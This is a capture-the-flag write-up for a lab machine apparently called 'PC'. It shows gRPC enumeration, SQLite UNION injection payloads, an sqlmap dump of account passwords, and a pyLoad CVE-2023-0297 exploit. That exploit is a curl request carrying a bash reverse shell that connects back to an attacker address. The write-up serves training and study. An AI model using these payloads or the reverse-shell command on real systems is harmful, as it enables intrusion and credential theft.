# Nmap
```
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChKXbRHNGTarynUVI8hN9pa0L2IvoasvTgCN80atXySpKMerjyMlVhG9QrJr62jtGg4J39fqxW06LmUCWBa0IxGF0thl2JCw3zyCqq0y8+hHZk0S3Wk9IdNcvd2Idt7SBv7v7x+u/zuDEryDy8aiL1AoqU86YYyiZBl4d2J9HfrlhSBpwxInPjXTXcQHhLBU2a2NA4pDrE9TxVQNh75sq3+G9BdPDcwSx9Iz60oWlxiyLcoLxz7xNyBb3PiGT2lMDehJiWbKNEOb+JYp4jIs90QcDsZTXUh3thK4BDjYT+XMmUOvinEeDFmDpeLOH2M42Zob0LtqtpDhZC+dKQkYSLeVAov2dclhIpiG12IzUCgcf+8h8rgJLDdWjkw+flh3yYnQKiDYvVC+gwXZdFMay7Ht9ciTBVtDnXpWHVVBpv4C7efdGGDShWIVZCIsLboVC+zx1/RfiAI5/O7qJkJVOQgHH/2Y2xqD/PX4T6XOQz1wtBw1893ofX3DhVokvy+nM=
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPqhx1OUw1d98irA5Ii8PbhDG3KVbt59Om5InU2cjGNLHATQoSJZtm9DvtKZ+NRXNuQY/rARHH3BnnkiCSyWWJc=
|   256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBG1KtV14ibJtSel8BP4JJntNT3hYMtFkmOgOVtyzX/R
50051/tcp open  unknown syn-ack
```

# Exploiting port 50051 (Grpc)
From online resources, we were able to find out that the service running on port 50051 is likely to be grpc. We can install the grpc UI from [here](https://github.com/fullstorydev/grpcui) to obtain a web UI for port 50051. This will then forward the GRPC service to a port on our localhost

```
┌──(kali㉿kali)-[~/Desktop/PC]
└─$ grpcui -plaintext pc.htb:50051
gRPC Web UI available at http://127.0.0.1:38051/
```

From http://127.0.0.1:38051, we are able to find requests for 3 functions --> RegisterUser, LoginUser and getInfo. The RegisterUser is used to register a user to the endpoint

```
// requests
POST /invoke/SimpleApp.RegisterUser HTTP/1.1
Host: 127.0.0.1:38051
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: ZAxbJeMRIQnYPK8HO0GYznUC6sKE9fJ5LYLd7vwfK8M
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://127.0.0.1:38051
Connection: close
Referer: http://127.0.0.1:38051/
Cookie: _grpcui_csrf_token=ZAxbJeMRIQnYPK8HO0GYznUC6sKE9fJ5LYLd7vwfK8M
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"timeout_seconds":1234,"metadata":[{"name":"test","value":"test"},{"name":"1","value":"2"}],"data":[{"username":"test","password":"test"}]}

// reponse
HTTP/1.1 200 OK
Content-Type: application/json
Date: Thu, 10 Aug 2023 06:28:10 GMT
Content-Length: 405
Connection: close

{
  "headers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    },
    {
      "name": "grpc-accept-encoding",
      "value": "identity, deflate, gzip"
    }
  ],
  "error": null,
  "responses": [
    {
      "message": {
        "message": "User Already Exists!!"
      },
      "isError": false
    }
  ],
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": []
}
```

The login user endpoint is used to login the user using the credentials that we input and returns the id number and the JWT token

```
// requests
POST /invoke/SimpleApp.LoginUser HTTP/1.1

Host: 127.0.0.1:38051
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: ZAxbJeMRIQnYPK8HO0GYznUC6sKE9fJ5LYLd7vwfK8M
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://127.0.0.1:38051
Connection: close
Referer: http://127.0.0.1:38051/
Cookie: _grpcui_csrf_token=ZAxbJeMRIQnYPK8HO0GYznUC6sKE9fJ5LYLd7vwfK8M
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"timeout_seconds":1234,"metadata":[{"name":"test","value":"test"},{"name":"1","value":"2"}],"data":[{"username":"test","password":"test"}]}

//response
HTTP/1.1 200 OK
Content-Type: application/json
Date: Thu, 10 Aug 2023 06:27:59 GMT
Content-Length: 586
Connection: close

{
  "headers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    },
    {
      "name": "grpc-accept-encoding",
      "value": "identity, deflate, gzip"
    }
  ],
  "error": null,
  "responses": [
    {
      "message": {
        "message": "Your id is 142."
      },
      "isError": false
    }
  ],
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": [
    {
      "name": "token",
      "value": "b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY5MTY1ODg3OH0.loJoaNHbjXPnQGrDC8lw3UMz-YZDrroFQU9uCeePsXA'"
    }
  ]
}

```
The getinfo endpoint uses the JWT token and ID generated from the loginuser endpoint to check for authorization and returns a reponse

```
//request
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:38051
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: ZAxbJeMRIQnYPK8HO0GYznUC6sKE9fJ5LYLd7vwfK8M
X-Requested-With: XMLHttpRequest
Content-Length: 215
Origin: http://127.0.0.1:38051
Connection: close
Referer: http://127.0.0.1:38051/
Cookie: _grpcui_csrf_token=ZAxbJeMRIQnYPK8HO0GYznUC6sKE9fJ5LYLd7vwfK8M
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"timeout_seconds":1234,"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY5MTY2ODMyNX0.NVpRb-ij4D1cH_xJmmIcq2cUNR5bMF3g_CZZZY0KzbQ"}],"data":[{"id":"757"}]}

//response
HTTP/1.1 200 OK
Content-Type: application/json
Date: Thu, 10 Aug 2023 09:05:57 GMT
Content-Length: 401
Connection: close

{
  "headers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    },
    {
      "name": "grpc-accept-encoding",
      "value": "identity, deflate, gzip"
    }
  ],
  "error": null,
  "responses": [
    {
      "message": {
        "message": "Will update soon."
      },
      "isError": false
    }
  ],
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": []
}

```

We are able to find an injection point on the id parameter in the getinfo servie and we also discover that the backend database service that is being used is sqlite. Modify the id paramter to the following payload, we are able to output the version of sqlite being used
```
SELECT sql FROM sqlite_schema`
```
Using sqlmap, we are then able to obtain a list of credentials. Using the list of credentials, we can then access the SSH server using sau's credentials

```
┌──(kali㉿kali)-[~/Desktop/PC]
└─$ sqlmap -r getinfo.txt --dump --level=4 --risk=3 --random-agent --threads 10
...
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```

# Obtaining user flag

```
sau@10.10.11.214's password: 
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ cat /home/sau/user.txt
<user flag>
sau@pc:~$ 
```

# Privilege Escalation
Using linpeas, we were able to discover a port 8000 that is open on the localhost

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                              
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      - 
```

We will use chisel to do a port forwarding and forward port 8000 from the server to our local machine. Afterwards, we are able to find out that port 8000 is using pyLoad that is vulnerable to CVE-2023-0297. We can then url encode our reverse shell payload and send the following ```curl``` command to spawn a reverse shell connection

```
┌──(kali㉿kali)-[~/Desktop/scripts]
└─$ curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.4%2F3000%200%3E%261%27\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```

# Obtaining root flag

```
root@pc:~/.pyload/data# cat /root/root.txt
cat /root/root.txt
<root flag>
root@pc:~/.pyload/data# 
```
# Post Exploitation
## Manual SQL Injection
Since we know that the backend database is sqlite, we can manually do an SQL Injection using sqlite queries. First, to validate that the SQL Injection is working properly as intended, we will send the following request with the ```SELECT sqlite_version()``` to check if we are able to view the version of sqlite being used.

```
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:40231
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: ZAxbJeMRIQnYPK8HO0GYznUC6sKE9fJ5LYLd7vwfK8M
X-Requested-With: XMLHttpRequest
Content-Length: 259
Origin: http://127.0.0.1:40231
Connection: close
Referer: http://127.0.0.1:40231/
Cookie: _grpcui_csrf_token=ZAxbJeMRIQnYPK8HO0GYznUC6sKE9fJ5LYLd7vwfK8M
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"metadata":[{"name": "token","value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY5MTcwMTgyOH0.i7u6VsaBMq4eCOa-VBEf5mKbOM_0eTgvil_k48fsPQY"}],"data":[{"id":"464 UNION SELECT name FROM pragma_database_list WHERE name = 'main';"}]}
```

Next, we will modify the id parameter in the request above with the following payload to find out the table names in the database. From the response, we are able to find out that we have 2 tables, accounts and messages

```
464 UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'
```

Next, we will check the column names of each tables by again modifying the id parameter in the above request with the following payload. From the response, we are able to find out that the accounts tables has 2 columns (username and password) and the messages table has 3 columns (id,username, message)

```
464 UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='messages';
```

Lastly, we can then obtain the username and password from the accounts table using the following query

```
464 UNION SELECT group_concat(username,password) from accounts;
```

## Code Analysis of SQL Injection
We would notice that in the request for id parameter, when we modify the parameter to become a string, we would obtain a type error. A type error only occurs when the backend code is parsing a variable of the wrong type and in this case, this would mean that the id parameter could not be a string parameter

```
// Request
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:42351
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: EoYMVB-ZHgwmPIH2l2jAJpXkg8HBKEhC3gDv1AptWVc
X-Requested-With: XMLHttpRequest
Content-Length: 198
Origin: http://127.0.0.1:42351
Connection: close
Referer: http://127.0.0.1:42351/
Cookie: _grpcui_csrf_token=EoYMVB-ZHgwmPIH2l2jAJpXkg8HBKEhC3gDv1AptWVc
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY5MTc4NTg3Mn0.mtwVsKukMAm05j6X2yGeh2rfGV3nOGV8hKV-g_DWYNg"}],"data":[{"id":"79'"}]}

// Response
HTTP/1.1 200 OK
Content-Type: application/json
Date: Fri, 11 Aug 2023 17:48:23 GMT
Content-Length: 364
Connection: close

{
  "headers": [],
  "error": {
    "code": 2,
    "name": "Unknown",
    "message": "Unexpected \u003cclass 'TypeError'\u003e: bad argument type for built-in operation",
    "details": []
  },
  "responses": null,
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    }
  ]
}
```

The vulnerable code that is vulnerable to SQL Injection lies in the following lines of code in the snippet below. In the code snippet, since the code uses ```fetchone()``` command,  we will not be able to exploit it via stacked SQL queries as it is going to return more than one SQL output. 

However, we will be able to do a ```UNION``` query to make the SQL query execute more than 1 SQL queries. In this case, we can supply a random integer as the id so that the SQL query does not return any output. In return, it will execute the malicious SQL Query and return output from there.

```
user_id = middle.authorization(token)
if user_id is True:
  try:
    result = cur.execute(f'SELECT message from messages where id = {request.id}').fetchone()[0]
    return app_pb2.getInfoResponse(message=f"{result}")
  except sqlite3.Error as er:
    return app_pb2.getInfoResponse(message=er)
```

It would be difficult for us to do an SQL Injection on the register user functionality as this functionality uses ```EXISTS``` and ```INSERT``` SQL Queries
- In the ```EXISTS``` SQL query, it is difficult for us to do an SQL injection as the code uses a ```fetchone()``` function that prevents us from executing stacked queries. Since we are only able to control the username and password variable, we unable to manipulate the SQL query to execute an SQL Injection attack as the query would eventually just check if the username and password exists
```
result = cur.execute('SELECT EXISTS(SELECT 1 FROM accounts WHERE username = ?)', (username, )).fetchone()[0]
```
- Subsequently, it not recommended to do an SQL Injection on the ```INSERT``` SQL query as this would mean that we will have to create a lot of enteries of usernames and passwords to test the SQL Injection attack

Similarly, the SQL queries on the login user functionality uses mainly ```EXISTS``` and ```INSERT``` SQL queries, so we are unable to do an SQL Injection on them as well.
